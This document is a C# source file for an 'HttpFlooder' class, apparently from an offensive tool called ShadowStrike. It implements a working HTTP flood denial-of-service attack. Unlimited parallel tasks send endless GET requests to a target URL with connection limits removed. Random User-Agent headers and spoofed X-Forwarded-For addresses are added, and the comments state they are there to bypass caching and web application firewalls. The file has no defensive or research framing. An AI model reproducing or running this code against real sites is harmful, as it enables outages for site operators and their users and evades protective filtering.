using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class HttpFlooder
    {
        private int _requestCount;
        public int RequestCount => _requestCount;

        private int _failedCount;
        public int FailedCount => _failedCount;
        private bool _isRunning;
        private Random _random = new Random();

        public void Stop()
        {
            _isRunning = false;
        }

        public async Task StartAttackAsync(string url, int threads, CancellationToken token)
        {
            _isRunning = true;
            _requestCount = 0;
            _failedCount = 0;

            // Use a shared HttpClient for connection pooling and better performance
            // But disable connection limit to allow massive concurrency
            var handler = new HttpClientHandler
            {
                MaxConnectionsPerServer = int.MaxValue,
                UseCookies = false, // Disable cookies for speed
                AutomaticDecompression = System.Net.DecompressionMethods.None,
                AllowAutoRedirect = false // Don't follow redirects, just hit the endpoint
            };

            using var client = new HttpClient(handler);
            client.Timeout = TimeSpan.FromSeconds(5); // Short timeout to fail fast and retry

            var tasks = new List<Task>();

            // Launch massive number of parallel tasks
            for (int i = 0; i < threads; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (_isRunning && !token.IsCancellationRequested)
                    {
                        try
                        {
                            // Create a lightweight request
                            var request = new HttpRequestMessage(HttpMethod.Get, url);
                            
                            // Randomize headers to bypass simple caching/WAF
                            request.Headers.Add("User-Agent", GetRandomUserAgent());
                            request.Headers.Add("X-Forwarded-For", GetRandomIp());
                            request.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate");
                            request.Headers.Add("Pragma", "no-cache");

                            // Fire and forget - we don't care about the response body, just the status
                            using var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, token);
                            
                            if (response.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref _requestCount);
                            }
                            else
                            {
                                // Even 4xx/5xx counts as a "hit" on the server
                                Interlocked.Increment(ref _requestCount); 
                            }
                        }
                        catch
                        {
                            Interlocked.Increment(ref _failedCount);
                        }
                    }
                }, token));
            }

            await Task.WhenAll(tasks);
        }

        private string GetRandomUserAgent()
        {
            var agents = new[]
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
            };
            return agents[_random.Next(agents.Length)];
        }

        private string GetRandomIp()
        {
            return $"{_random.Next(1, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(1, 255)}";
        }
    }
}
